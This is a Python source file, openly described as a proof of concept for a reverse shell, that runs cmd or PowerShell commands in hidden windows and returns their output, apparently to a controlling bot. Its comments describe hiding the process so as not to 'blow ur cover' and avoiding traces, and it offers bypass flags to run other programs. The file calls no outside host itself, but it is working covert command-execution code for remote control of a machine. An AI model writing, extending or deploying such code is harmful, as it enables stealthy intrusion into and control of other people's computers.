# execute_command.py
# m 08/02/2026
# opens a new subprocess and executes command returns string.

import subprocess


def create_subprocess_and_execute(command,*args) -> str: # proof of concept function of how a attacker might reverse shell.
    """
    Creates a new subprocess of a cmd or powershell [exceptions below]
    takes argument command that should have 3 arguments in a list
    example : cmd,/c,dir
    change cmd to pwsh or powershell for powershell.
    use extra argument 'BYPASS_TERMINAL_CHECK" to launch any other subprocess
    use extra argument 'BYPASS_DELETION_CHECK" to bypass '/c' check.
    """
    bypass_terminal_check = False
    bypass_deletion_check = False

    if args:
        if "BYPASS_TERMINAL_CHECK" in args:
            bypass_terminal_check = True
        if "BYPASS_DELETION_CHECK" in args:
            bypass_deletion_check = True
    # checks for extra arguments


    if command[0] != "cmd" and command[0] != "powershell" and command[0] != "pwsh" and not bypass_terminal_check:
        return "Invalid terminal, use BYPASS_TERMINAL_CHECK as extra argument if it was intentional"
    # this is done so you dont accidentaly pop up a process with a GUI and blow ur cover.

    command3error = "The command to be run will loop itself and freeze the bot, it has been ignored."
    # This is done because if you make a invisible cmd process spawn an invisible cmd process it will wait for a result
    # Normally with the /c flag it will just exit but without it, freezes the bot.
    
    match command[2]:
        case "cmd" | "ps" | "powershell": return command3error
        case _ : pass

        
    if command[1] != "/c" and not bypass_deletion_check:
        return "Invalid second argument, use BYPASS_DELETION_CHECK as extra argument if it was intentional."
    # this is done to not leave traces accidentaly.

    CREATE_NO_WINDOW = 0x08000000
    
    try:
        # We use capture_output=True to get the results back in Python
        result = subprocess.run(
            command, 
            capture_output=True, 
            text=True, 
            creationflags=CREATE_NO_WINDOW
        )
        return result.stdout
    except Exception as e:
        return f"An error occurred: {e}"

async def execute_command(command,*args) -> str: # proof of concept of a reverse shell
    """
    Uses create_subprocess_and_execute in an try and expect state.
    Takes command, an list argument that should posses:
    The commandline, args, and command.
    Example : ['cmd','/c','dir']

    """
    try:
        return create_subprocess_and_execute(command,*args)
    except Exception as E:
        return str(E)

# Example usage: List files in the current directory
# output = execute_command(['cmd', '/c', 'dir'])
# print("Command Output:\n", output)